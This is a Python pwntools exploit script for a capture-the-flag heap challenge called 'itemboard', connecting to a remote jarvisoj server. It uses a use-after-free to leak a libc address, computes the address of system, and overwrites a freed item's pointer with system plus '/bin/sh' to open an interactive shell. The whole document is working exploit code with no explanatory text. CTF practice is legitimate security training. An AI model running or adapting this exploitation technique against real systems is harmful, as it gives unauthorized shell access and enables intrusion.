from pwn import *
import struct

debug=0
context.log_level='debug'
context.arch='amd64'
ef=ELF('./itemboard')
if debug:
    p=process('./itemboard')
    gdb.attach(proc.pidof(p)[0])
    e=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    r=ROP(e)
    offset=0x399000
else:
    p=remote('pwn2.jarvisoj.com', 9887)
    e=ELF('./libc.so')
    r=ROP(e)
    offset=0x3be000

def add_item(name,length,desc):
    p.sendline('1')
    p.recvuntil('Item name?')
    p.sendline(name)
    p.recvuntil("Description's len?")
    p.sendline(str(length))
    p.recvuntil('Description?')
    p.send(desc)
    p.recvuntil('Add Item Successfully!')

def list_item():
    p.sendline('2')
    p.recvuntil('Item list')
    data=p.recvuntil('1.')[:-3]
    p.recvuntil('choose:')
    return data

def show_item(index):
    p.sendline('3')
    p.recvuntil('Which item?')
    p.sendline(str(index))
    data=p.recvuntil('1.')[:-3]
    p.recvuntil('choose:')
    return data

def delete_item(index):
    p.sendline('4')
    p.recvuntil("Which item?")
    p.sendline(str(index))

add_item('t',0x100,'\x0a')
add_item('t',0x100,'\x0a')
delete_item(0)
data=show_item(0)
d=data.index('ion:')+4
libc=data[d:d+6]+'\x00\x00'
libc=struct.unpack('<Q',libc)[0]
t=libc
libc=libc-libc%0x1000-offset


binsh=libc+e.search('/bin/sh').next()
system=libc+e.symbols['system']

delete_item(1)

add_item('/bin/sh;EEEEEEEE'+p64(system),24,'\x0a')
delete_item(0)

p.interactive()